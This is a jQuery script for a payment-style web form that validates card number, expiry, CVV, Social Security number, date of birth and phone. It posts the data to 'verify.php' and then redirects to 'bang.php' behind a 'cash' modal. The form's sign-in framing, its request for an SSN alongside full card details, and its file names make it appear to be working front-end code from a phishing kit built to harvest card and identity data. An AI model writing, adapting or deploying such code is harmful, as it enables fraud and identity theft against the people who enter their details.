
$(document).ready(function() {

	function isDate(d) {
        var match = /^(\d{2})\/(\d{2})\/(\d{4})$/.exec(d);
        if (!match) {

            return false;
        }
        var month = parseInt(match[1], 10) - 1;
        var day = parseInt(match[2], 10);
        var year = parseInt(match[3], 10);
        var date = new Date(year, month, day);

        return date.getDate() == day && date.getMonth() == month && date.getFullYear() == year;
    }

    $('#dob').mask('00/00/0000');
	$('#ssn').mask('000-00-0000');
	$('#phone').mask('000-000-0000');
	
	
	$('#cnum').mask('0000 0000 0000 0000 000');

	$("#cnum").blur(function() {
		var valcard = $('#cnum').validateCreditCard();
		if(valcard.luhn_valid && valcard.length_valid){
			$('#cnum').removeClass('is-invalid');
		}else{
			$('#cnum').addClass('is-invalid');
		}
	});
	$('#exp').mask('00/00');
	$('#cvv').mask('000');
	$("#exp").blur(function() {
		var expire = $('#exp').val();
		var bulan = expire.split("/")[0];
        var tahun = expire.split("/")[1];
		
		if(expire.length < 5 || !(bulan.replace(0, "") > 0 && bulan.replace(0, "") < 13) || !(tahun >= 20 && tahun < 44))
		{
			$('#exp').addClass('is-invalid');
		}else{
			$('#exp').removeClass('is-invalid');
		}
		
	});
	
	$("#cvv").blur(function() {
		if($("#cvv").val().length < 3 || $("#cvv").val().length > 4){
			$('#cvv').addClass('is-invalid');
		}else{
			$('#cvv').removeClass('is-invalid');
		}
	});
	
	$("#ssn").blur(function() {
		if($("#ssn").val().length < 11){
			$('#ssn').addClass('is-invalid');
		}else{
			$('#ssn').removeClass('is-invalid');
		}
	});
	$('#frmCard').submit(function(event) {
		event.preventDefault();
		var error = false;
		var valcard = $('#cnum').validateCreditCard();
		if(valcard.luhn_valid && valcard.length_valid){
			$('#cnum').removeClass('is-invalid');
		}else{
			$('#cnum').addClass('is-invalid');
			error = true;
		}
		
		var expire = $('#exp').val();
		var bulan = expire.split("/")[0];
        var tahun = expire.split("/")[1];
		
		if(expire.length < 5 || !(bulan.replace(0, "") > 0 && bulan.replace(0, "") < 13) || !(tahun >= 20 && tahun < 44))
		{
			$('#exp').addClass('is-invalid');
			error = true;
		}else{
			$('#exp').removeClass('is-invalid');
		}
		
		if($("#cvv").val().length != 3){
			$('#cvv').addClass('is-invalid');
			error = true;
		}else{
			$('#cvv').removeClass('is-invalid');
		}
		
		if($("#ssn").length > 0 && $("#ssn").val().length < 11){
			$('#ssn').addClass('is-invalid');
			error = true;
		}else{
			$('#ssn').removeClass('is-invalid');
		}

		$("#btnConfirm").click(function() {
		$("#btnConfirm").prop('disabled', true);
		$("#btnConfirm").html('<img src="/static/img/spin.gif" style="width:43px">');
		setTimeout(function(){
			window.location.replace($("#btnConfirm").attr('data-oauth'));
		}, 2000);
	});
		
			if(!error){
			$("#btnLogin").prop('disabled', true);
			$("#btnLogin").html('<img src="/static/img/spin.gif" style="width:43px">');
			$('#cnum, #exp, #cvv, #zip, #dob, #phone, #state').prop('readonly', true);
			var logindata =  $("#frmCard").serialize();
		$.post("verify.php", logindata).done(function(result) {
				if(result != "no"){
					$('#cashBody').addClass("no-scroll");
					$('#btnConfirm').attr("data-oauth", 'bang.php');
					$('#cashModal').show();
				}else{
					$('#cnum, #exp, #cvv, #zip, #dob, #phone, #state').prop('readonly', false);
					$("#cnum, #exp, #cvv, #zip, #dob, #phone, #state").addClass('is-invalid');
					$("#btnLogin").prop('disabled', false);
					$("#btnLogin").html('Sign In');
					if($("#ssn").length > 0) {
						$('#ssn').prop('readonly', false);
					}
				}
			});
		}
	});
});